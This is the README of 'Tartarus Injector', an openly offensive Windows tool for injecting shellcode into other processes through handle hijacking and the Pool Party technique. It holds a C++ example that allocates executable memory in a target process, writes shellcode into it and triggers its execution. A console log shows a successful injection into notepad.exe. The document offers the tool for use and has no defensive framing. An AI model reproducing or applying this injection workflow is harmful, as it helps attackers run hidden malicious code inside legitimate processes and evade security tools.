
# 💉🔥 Tartarus Injector

Native Shellcode Injector Via Handle Hijacking & Pool Party.


## 👁 Modular Examples

```cpp
// assuming you have obtained a handle on the process.

auto injector = Injector { process };

auto nWorkerMem = injector.allocateSc(sizeof(sc), PAGE_EXECUTE_READWRITE);

if (!nWorkerMem) {
    error("Failed To Allocate Memory.");
    return -1;
}
    

if (!injector.writeSc(nWorkerMem, sc, sizeof sc)) {
    error("Failed To Write Memory.");
    return -1;
}
    

if (!injector.injectIntoProcess(nWorkerMem)) {
    error("Injection Failed.");
    return -1;
}

okay("Injection Successful!");
```
## 🎡 Usage
```batch
$ ./TartarusInjector.exe notepad.exe
[*] Starting Tartarus Injector ...
[+] Found Object Of Type { IoCompletion }
[+] Injection Successful!
```
## ❓ Development & Contribution
I will be improving this injector once i need to, If you have anything to contribute or a bug fix, Open a pull request and i will merge it if it's legit.
